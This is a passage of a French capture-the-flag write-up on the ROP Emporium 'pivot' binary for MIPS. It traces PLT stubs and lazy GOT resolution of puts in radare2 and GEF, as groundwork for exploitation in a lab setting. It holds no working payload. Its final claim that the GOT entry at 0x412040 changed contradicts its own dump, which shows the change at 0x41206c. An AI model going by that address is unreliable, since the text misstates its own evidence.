    19  0x00000e70 0x00400e70 GLOBAL FUNC   16       imp.__libc_start_main
    20  0x00000e60 0x00400e60 GLOBAL FUNC   16       imp.foothold_function
    21  0x00000e50 0x00400e50 GLOBAL FUNC   16       imp.exit
    22  ---------- 0x00000000 WEAK   FUNC   16       imp.__gmon_start__
    23  0x00000e40 0x00400e40 GLOBAL FUNC   16       imp.puts
    24  0x00000e30 0x00400e30 GLOBAL FUNC   16       imp.malloc
    25  0x00000e20 0x00400e20 GLOBAL FUNC   16       imp.free
    26  0x00000e10 0x00400e10 GLOBAL FUNC   16       imp.printf
    27  ---------- 0x00000000 WEAK   NOTYPE 16       imp._ITM_deregisterTMCloneTable
    28  0x00000e00 0x00400e00 GLOBAL FUNC   16       imp.read

Si on observe la PLT on voit que chaque fonction importée possède une entrée de 4 mots.

```mips
    [0x00400e00]> pd 24
                ;-- section..MIPS.stubs:
                ;-- .MIPS.stubs:
                ;-- read:
                ; UNKNOWN XREF from aav.0x004003ec @ +0x1c4
                ; CALL XREFS from sym.pwnme @ 0x400ba0, 0x400c18
    ┌ 16: sym._MIPS_STUBS_ ();
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_1ch @ sp+0x1c
    │           0x00400e00      1080998f       lw t9, -0x7ff0(gp)          ; obj._GLOBAL_OFFSET_TABLE_
    │                                                                      ; [0x412020:4]=0 ; [14] -r-x section size 176 named .MIPS.stubs
    │           0x00400e04      2578e003       move t7, ra
    │           0x00400e08      09f82003       jalr t9
    └           0x00400e0c      1c001824       addiu t8, zero, 0x1c
                ;-- printf:
                ; UNKNOWN XREF from aav.0x004003ec @ +0x1a4
                ; CALL XREFS from sym.pwnme @ 0x400b48, 0x400b80, 0x400bf4
    ┌ 16: aav.0x00400e10 ();
    │           0x00400e10      1080998f       lw t9, -0x7ff0(gp)          ; obj._GLOBAL_OFFSET_TABLE_
    │                                                                      ; [0x412020:4]=0
    │           0x00400e14      2578e003       move t7, ra
    │           0x00400e18      09f82003       jalr t9
    └           0x00400e1c      1a001824       addiu t8, zero, 0x1a
                ;-- free:
                ; UNKNOWN XREF from aav.0x004003ec @ +0x194
                ; CALL XREF from main @ 0x400a90
    ┌ 16: aav.0x00400e20 ();
    │           0x00400e20      1080998f       lw t9, -0x7ff0(gp)          ; obj._GLOBAL_OFFSET_TABLE_
    │                                                                      ; [0x412020:4]=0
    │           0x00400e24      2578e003       move t7, ra
    │           0x00400e28      09f82003       jalr t9
    └           0x00400e2c      19001824       addiu t8, zero, 0x19
                ;-- malloc:
                ; UNKNOWN XREF from aav.0x004003ec @ +0x184
                ; CALL XREF from main @ 0x400a10
    ┌ 16: aav.0x00400e30 ();
    │           0x00400e30      1080998f       lw t9, -0x7ff0(gp)          ; obj._GLOBAL_OFFSET_TABLE_
    │                                                                      ; [0x412020:4]=0
    │           0x00400e34      2578e003       move t7, ra
    │           0x00400e38      09f82003       jalr t9
    └           0x00400e3c      18001824       addiu t8, zero, 0x18
                ;-- puts:
                ; XREFS: UNKNOWN 0x00400560  CALL 0x004009d8  CALL 0x004009f4  CALL 0x00400a3c  CALL 0x00400aac  CALL 0x00400b28  
                ; XREFS: CALL 0x00400b64  CALL 0x00400bbc  CALL 0x00400bd8  CALL 0x00400c34  
    ┌ 16: aav.0x00400e40 ();
    │           0x00400e40      1080998f       lw t9, -0x7ff0(gp)          ; obj._GLOBAL_OFFSET_TABLE_
    │                                                                      ; [0x412020:4]=0
    │           0x00400e44      2578e003       move t7, ra
    │           0x00400e48      09f82003       jalr t9
    └           0x00400e4c      17001824       addiu t8, zero, 0x17
                ;-- exit:
                ; UNKNOWN XREF from aav.0x004003ec @ +0x154
                ; CALL XREF from main @ 0x400a54
                ; CALL XREF from sym.uselessFunction @ 0x400c98
    ┌ 16: aav.0x00400e50 ();
    │           0x00400e50      1080998f       lw t9, -0x7ff0(gp)          ; obj._GLOBAL_OFFSET_TABLE_
    │                                                                      ; [0x412020:4]=0
    │           0x00400e54      2578e003       move t7, ra
    │           0x00400e58      09f82003       jalr t9
    └           0x00400e5c      15001824       addiu t8, zero, 0x15
            ;-- foothold_function:
            ; UNKNOWN XREF from aav.0x004003ec @ +0x144
            ; CALL XREF from sym.uselessFunction @ 0x400c80
    ┌ 16: aav.0x00400e60 ();
    │           0x00400e60      1080998f       lw t9, -0x7ff0(gp)          ; obj._GLOBAL_OFFSET_TABLE_
    │                                                                      ; [0x412020:4]=0
    │           0x00400e64      2578e003       move t7, ra
    │           0x00400e68      09f82003       jalr t9
    └           0x00400e6c      14001824       addiu t8, zero, 0x14
```

Pour foothold_function on a 

    lw t9, -0x7ff0(gp) ; Chargement de l'adresse de la première entrée de la GOT.
    move t7, ra        ; sauvegarde de la valeur courante du registre d'adresse de retour `ra`
    jalr t9            ; appel le l'adresse lue dans la got
    addiu t8, zero, 0x14 ; simultanément affect $t8=14 (no de la fonction) à 'usage de la fonction de résolution appellée la première fois



Observation de la resolution d'adresse de puts dans main
Dans main on a un appel de puts.
C'est l'occasion d'observer la modification de la GOT par l'entrée PLT

│           0x004009d8      09f82003       jalr t9
│           0x004009dc      00000000       nop
│           0x004009e0      1000dc8f       lw gp, (var_10h)
│           0x004009e4      4000023c       lui v0, 0x40                ; '@'
│           0x004009e8      280f4424       addiu a0, v0, 0xf28         ; 0x400f28 ; "MIPS\n" ; argc ; str.MIPS_n
│           0x004009ec      5c80828f       lw v0, -sym.imp.puts(gp)    ; [0x41206c:4]=0x400e40 sym.imp.puts ; "@\x0e@"
│           0x004009f0      25c84000       move t9, v0
│           0x004009f4      09f82003       jalr t9



ON s'arrête su le premier appel de puts dans main

        0x4009cc <main+76>        addiu  a0, v0, 3856
        0x4009d0 <main+80>        lw     v0, -32676(gp)
        0x4009d4 <main+84>        move   t9, v0
    →  0x4009d8 <main+88>        jalr   t9
        0x4009dc <main+92>        nop    
        0x4009e0 <main+96>        lw     gp, 16(s8)
        0x4009e4 <main+100>       lui    v0, 0x40
        0x4009e8 <main+104>       addiu  a0, v0, 3880
        0x4009ec <main+108>       lw     v0, -32676(gp)


    gef➤  i r t9 a0
    t9: 0x400e40
    a0: 0x400f10
    gef➤  x/s $a0
    0x400f10:	"pivot by ROP Emporium"

0x400e40 est l'entrée de puts dans la PLT

On entre dans l'entrée de la PLT
    si 
    →   0x400e40 <puts+0>         lw     t9, -32752(gp)
        0x400e44 <puts+4>         move   t7, ra
        0x400e48 <puts+8>         jalr   t9
        0x400e4c <puts+12>        li     t8, 23
        0x400e50 <exit+0>         lw     t9, -32752(gp)
        0x400e54 <exit+4>         move   t7, ra

    ni
         0x400e40 <puts+0>         lw     t9, -32752(gp)
 →   0x400e44 <puts+4>         move   t7, ra
     0x400e48 <puts+8>         jalr   t9
     0x400e4c <puts+12>        li     t8, 23
     0x400e50 <exit+0>         lw     t9, -32752(gp)
     0x400e54 <exit+4>         move   t7, ra
     0x400e58 <exit+8>         jalr   t9

On a 
    t9: 0x3ffd4530

Cette adresse est contenue dans le premier mot de la got

La GOT est a cette adresse (info file)

	0x00412020 - 0x00412084 is .got

Etat de la got a ce moment :

    gef➤  x/28xw 0x00412020
    0x412020:	0x3ffd4530	0xbffbc000	0x00400980	0x00400cf0
    0x412030:	0x00400d94	0x00400000	0x00400758	0x00411ff0
    0x412040:	0x00000000	0x00000000	0x00000000	0x00000000
    0x412050:	0x3ff80d7c	0x00400e90	0x3fe23180	0x3fdd09ec
    0x412060:	0x00400e60	0x00400e50	0x00000000	0x00400e40
    0x412070:	0x00400e30	0x00400e20	0x00400e10	0x00000000
    0x412080:	0x00400e00	0x00000000	0x00000000	0x00000000

On pose un point d'arrêt après le puts (main+144)

    gef➤  x/28xw 0x00412020
    0x412020:	0x3ffd4530	0xbffbc000	0x00400980	0x00400cf0
    0x412030:	0x00400d94	0x00400000	0x00400758	0x00411ff0
    0x412040:	0x00000000	0x00000000	0x00000000	0x00000000
    0x412050:	0x3ff80d7c	0x00400e90	0x3fe23180	0x3fdd09ec
    0x412060:	0x00400e60	0x00400e50	0x00000000 *0x3fe22600*
    0x412070:	0x00400e30	0x00400e20	0x00400e10	0x00000000
    0x412080:	0x00400e00	0x00000000	0x00000000	0x00000000

On constate la modification de l'enteée  0x412040 de la GOT avec l'adresse de puts dans la libc.
